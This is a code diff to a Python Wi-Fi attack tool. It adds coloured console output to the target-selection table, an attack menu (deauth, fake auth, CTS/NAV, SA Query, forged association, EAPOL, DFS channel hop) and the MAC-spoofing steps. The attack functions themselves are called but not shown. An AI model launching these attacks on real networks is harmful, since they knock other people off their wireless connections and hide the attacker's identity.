@@ -16,12 +16,12 @@ MACCHANGER_BIN = '/usr/bin/macchanger'
 def get_aps(mon_interface):
     targets = {}
     print("Hit Ctrl-C when ready to select a target")
-    print(" {: >3}  {: <32}  {: <17}  {: <4}  {: >8}".format("#", "ESSID", "BSSID", "SEC", "80211.w"))
-    print("-" * 73)
+    cprint(" {: >3}  {: <32}  {: <17}  {: <4}  {: >8}".format("#", "ESSID", "BSSID", "SEC", "80211.w"), 'cyan', 'on_grey')
+    cprint("-" * 73, 'cyan', 'on_grey')
     while True:
         try:
             target = mon_interface.get_new_target()
-            color, n = None, None
+            color, n = 'on_grey', None
             n = len(targets)
             targets[n] = target
             if target.w:
@@ -30,7 +30,7 @@ def get_aps(mon_interface):
                 cprint("({: >3}) {: <32}  {}  {: <4}  {: >8}".format(n, target.essid,
                                                                      target.bssid, target.encrypt,
                                                                      target.w or 'no'),
-                       'white', color)
+                       'cyan', color)
         except KeyboardInterrupt:
             print()
             return targets
@@ -54,8 +54,8 @@ def print_attacks():
     print("1 - Deauth")
     print("2 - FakeAuth attack")
     print("3 - CTS NAV attack")
-    print("4 - SA Query attack")
-    print("5 - Forged Assoc. attack")
+    print("4 - SA Query attack (not implemented)")
+    print("5 - Forged Assoc. attack (not implemented)")
     print("6 - EAPOL Deauth attack")
     print("7 - DFS Channel Hop attack")
 
@@ -92,7 +92,7 @@ def main():
         macchanger = False
     else:
         macchanger = True
-        cprint("Spoofing MAC address", 'grey')
+        cprint("Spoofing MAC address", 'grey', 'on_white')
         mon_interface.spoof_mac()
 
     try:
@@ -142,25 +142,33 @@ def main():
 
         if attack == 1:
             count = int(args.option) if args.option else 10
+            cprint("Running Deauth attack...", 'red')
             mon_interface.deauth(station.mac_addr, ap.bssid, count)
         elif attack == 2:
+            cprint("Running Auth attack...", 'red')
             auth_attack(mon_interface, station, ap)
         elif attack == 3:
+            cprint("Running CTS/NAV attack...", 'red')
             cts_nav_attack(mon_interface)
         elif attack == 4:
+            cprint("Running SA Query attack...", 'red')
             sa_query_attack(mon_interface, ap, station)
         elif attack == 5:
+            cprint("Running forged_1 attack...", 'red')
             forged_1(mon_interface, ap, station)
         elif attack == 6:
+            cprint("Running EAPOL attack...", 'red')
             eapol_attack_deauth(mon_interface, ap, station, spam=args.option)
         elif attack == 7:
+            cprint("Running DFS attack with channel " + args.option + "...", 'red')
             dfs_hop_attack(mon_interface, ap, args.essid or ap.essid, int(args.option))
 
     except KeyboardInterrupt:
         print()
         if macchanger:
             mon_interface.reset_mac()
-            cprint("Restoring MAC address...", 'grey')
+            cprint("Restoring MAC address...", 'grey', 'on_white')
+        mon_interface.set_managed_mode()
         cprint("Exiting...", 'yellow')
 
 
